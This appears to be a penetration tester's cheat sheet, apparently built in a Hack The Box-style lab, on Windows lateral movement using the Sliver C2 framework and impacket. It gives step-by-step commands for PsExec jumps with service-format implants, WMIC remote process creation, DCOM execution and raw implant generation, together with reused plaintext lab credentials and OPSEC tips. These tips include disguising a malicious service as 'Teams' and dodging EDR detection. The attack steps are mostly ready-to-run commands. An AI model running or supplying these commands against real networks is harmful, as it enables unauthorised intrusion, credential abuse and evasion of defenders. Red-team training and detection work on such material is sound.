> [!note] After performing lateral movement, consider reverse port forwarding for ingress tool transfer
## PsExec
PsExec works by uploading a service binary to the target and creating and starting a new Windows service to execute the binary. Finally, we will get interactive access with SYSTEM privilege.

If a compromised user has local administrator privilege on other hosts, we can leverage PsExec to move laterally.

> **OPSEC:** Many C2 frameworks have the psexec lateral movement feature, but these service binaries are easily flagged by AV/EDR.

Usage
```bash
# Impersonate user
sliver > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!

# Test access
sliver > ls //srv01.child.htb.local/c$

# Start pivot listener (tcp OR named-pipe)
sliver > pivots tcp --bind <pivot_ip>     
	# make note of port used    
# or
sliver > ls \\.\pipe\  # OPSEC - get pipe names
sliver > pivots named-pipe --bind <pipe_name> [--allow-all]

# Display current pivot listeners
sliver > pivots

# Implant generation
sliver > generate --format service -i <pivot_ip>:9898 [--skip-symbols] -N psexec-pivot 

# Jump
sliver > psexec --custom-exe /path/to/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams <target-host-FQDN>
	# OPSEC! Service name and description are important

sliver > sessions
sliver > pivots
```

> Note that Sliver (psexec) will generate a random file name, and by default, it will place it in C:\Windows\Temp, which can be monitored. 
## WMIC
WMI is also a native way for lateral movement and remote code execution; it requires local administrator privilege.

Usage
```bash
# Start pivot listener (tcp OR named-pipe)
sliver > pivots tcp --bind <pivot_ip>     
	# make note of port used    

sliver > ls \\.\pipe\  # OPSEC - get pipe names
sliver > pivots named-pipe --bind <pipe_name> [--allow-all]

# Implant generation
sliver > generate -i <pivot_ip>:9898 [--skip-symbols] -N wmicpivot

# Impersonate
sliver > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!

# Upload binary to disk
sliver > cd //srv02.child.htb.local/c$/windows/tasks
sliver > upload wmicpivot.exe

sliver > rev2self

# Execute
sliver >  execute -o wmic /node:<rhost_ip> /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"

sliver > pivots
sliver > sessions


# Another way of getting a shell
proxychains impacket-wmiexec child/svc_sql:jkhnrjk123\!@<rhost_ip>
```

> [!Note] wmiexec.py could get detected because it writes the output of the command execution to a file on the ADMIN$ by default. We can specify the target share with the "-share" and choosing the C$, for example.
## DCOM
For attackers, DCOM can also be used for remote code execution and lateral movement.

> [!Note] Lateral movement via DCOM is harder to detect since DCOM has many methods with different IOCs.

Usage
```bash
proxychains impacket-dcomexec -object MMC20 child/svc_sql:jkhnrjk123\!@<rhost_ip>
	# ShellWindows, ShellBrowserWindow are other options to MMC20.
```


## FIRE IT RAW
In case you just need to make an implant to fire manually...
```bash
sliver > generate --tcp-pivot <pivot_ip>:9898 --os windows --arch amd64 --format exe

C:\path\to\implant.exe
```